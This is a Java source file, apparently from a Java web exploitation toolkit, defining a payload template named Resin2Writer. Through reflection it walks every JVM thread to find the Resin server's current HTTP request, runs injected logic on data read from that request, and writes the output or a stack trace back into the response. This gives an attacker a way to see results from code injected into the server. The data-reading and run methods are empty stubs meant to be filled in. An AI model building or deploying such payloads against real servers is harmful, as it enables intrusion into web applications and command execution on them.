package com.reajason.javaweb.probe.payload.response;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Set;

/**
 * @author ReaJason
 * @since 2026/7/4
 */
public class Resin2Writer {

    private static boolean ok = false;

    public Resin2Writer() {
        if (ok) {
            return;
        }
        try {
            Object request = getCurrentRequest();
            if (request == null) {
                return;
            }
            Object response = invokeMethod(request, "getResponse", null, null);
            String data = getDataFromReq(request);
            if (data != null && !data.isEmpty()) {
                String result = "";
                try {
                    result = run(data);
                } catch (Throwable e) {
                    result = getErrorMessage(e);
                }
                if (result != null) {
                    try {
                        OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", null, null);
                        outputStream.write(result.getBytes());
                        outputStream.flush();
                        outputStream.close();
                    } catch (Throwable e) {
                        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                        writer.write(result);
                        writer.flush();
                        writer.close();
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        } finally {
            ok = true;
        }
    }

    private Object getCurrentRequest() {
        Thread currentThread = Thread.currentThread();
        Object request = getRequestFromThread(currentThread, currentThread);
        if (request != null) {
            return request;
        }
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            request = getRequestFromThread(thread, currentThread);
            if (request != null) {
                return request;
            }
        }
        return null;
    }

    private Object getRequestFromThread(Thread thread, Thread currentThread) {
        Object target = null;
        try {
            target = getFieldValue(thread, "target");
        } catch (Throwable e) {
            try {
                target = getFieldValue(getFieldValue(thread, "holder"), "task");
            } catch (Throwable ignored) {
            }
        }
        return getRequestFromTarget(target, currentThread);
    }

    private Object getRequestFromTarget(Object target, Thread currentThread) {
        if (target == null) {
            return null;
        }
        Object request = null;
        if ("com.caucho.server.http.HttpRequest".equals(target.getClass().getName())) {
            request = target;
        } else {
            try {
                request = getFieldValue(target, "request");
            } catch (Throwable ignored) {
            }
        }
        if (request == null || !"com.caucho.server.http.HttpRequest".equals(request.getClass().getName())) {
            return null;
        }
        try {
            Object requestThread = getFieldValue(request, "_thread");
            if (requestThread != null && requestThread != currentThread) {
                return null;
            }
        } catch (Throwable ignored) {
        }
        return request;
    }

    private String getDataFromReq(Object request) throws Exception {
        return null;
    }

    private String run(String data) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
